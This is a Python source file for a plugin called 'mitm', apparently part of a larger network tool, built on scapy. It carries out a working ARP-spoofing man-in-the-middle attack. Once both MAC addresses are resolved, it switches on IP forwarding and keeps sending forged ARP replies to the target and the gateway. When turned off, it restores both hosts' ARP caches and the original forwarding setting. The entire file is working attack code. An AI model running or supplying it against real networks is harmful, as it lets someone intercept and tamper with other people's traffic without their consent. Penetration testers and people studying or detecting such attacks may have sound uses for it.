import time
from threading import Event, Thread

from scapy.all import Ether, ARP, sendp, srp, getmacbyip

from ..context import Module


class MitmModule(Module):
    name = "mitm"

    def __init__(self, ctx):
        super().__init__(ctx)
        self.target_ip = None
        self.gateway_ip = None
        self.target_mac = None
        self.gateway_mac = None
        self.dur = Event()
        self.threads = []
        self._orig_forward = None

    def on(self, target_ip=None, gateway_ip=None, *a):
        if not self.ctx.mitm_enabled:
            self.ctx.log("[mitm] requires --mitm", "err")
            return
        if self.active:
            return
        if not target_ip or not gateway_ip:
            self.ctx.log("[mitm] usage: module mitm on <target_ip> <gw_ip>", "err")
            return
        self.target_ip, self.gateway_ip = target_ip, gateway_ip
        self.target_mac = self._resolve(target_ip)
        self.gateway_mac = self._resolve(gateway_ip)
        if not self.target_mac or not self.gateway_mac:
            self.ctx.log("[mitm] MAC resolve failed", "err")
            return
        try:
            self._orig_forward = open("/proc/sys/net/ipv4/ip_forward").read().strip()
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1\n")
        except Exception as e:
            self.ctx.log(f"[mitm] ip_forward: {e}", "warn")
        self.dur.clear()
        self.active = True
        self.threads = [
            Thread(target=self._spoof,
                   args=(self.target_ip, self.target_mac, self.gateway_ip),
                   daemon=True),
            Thread(target=self._spoof,
                   args=(self.gateway_ip, self.gateway_mac, self.target_ip),
                   daemon=True),
        ]
        for t in self.threads:
            t.start()
        self.ctx.log(f"[mitm] ACTIVE {target_ip} <-> {gateway_ip}", "ok")

    def _resolve(self, ip):
        try:
            m = getmacbyip(ip)
            if m:
                return m
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                         timeout=3, iface=self.ctx.iface, verbose=False)
            if ans:
                return ans[0][1].hwsrc
        except Exception:
            pass
        return None

    def _spoof(self, dst_ip, dst_mac, spoof_ip):
        pkt = Ether(dst=dst_mac) / ARP(op=2, pdst=dst_ip, hwdst=dst_mac,
                                       psrc=spoof_ip)
        while not self.dur.is_set():
            try:
                sendp(pkt, iface=self.ctx.iface, verbose=False)
            except Exception:
                pass
            self.dur.wait(2.0)

    def off(self):
        if not self.active:
            return
        self.dur.set()
        for t in self.threads:
            t.join(timeout=3)
        try:
            if self.target_mac and self.gateway_mac:
                for _ in range(3):
                    sendp(Ether(dst=self.target_mac) / ARP(
                        op=2, pdst=self.target_ip, hwdst=self.target_mac,
                        psrc=self.gateway_ip, hwsrc=self.gateway_mac),
                        iface=self.ctx.iface, verbose=False)
                    sendp(Ether(dst=self.gateway_mac) / ARP(
                        op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                        psrc=self.target_ip, hwsrc=self.target_mac),
                        iface=self.ctx.iface, verbose=False)
                    time.sleep(0.5)
        except Exception:
            pass
        if self._orig_forward is not None:
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write(self._orig_forward + "\n")
            except Exception:
                pass
        self.active = False
        self.ctx.log("[mitm] off", "ok")

    def status(self):
        return f"active ({self.target_ip} <-> {self.gateway_ip})" if self.active else "off"
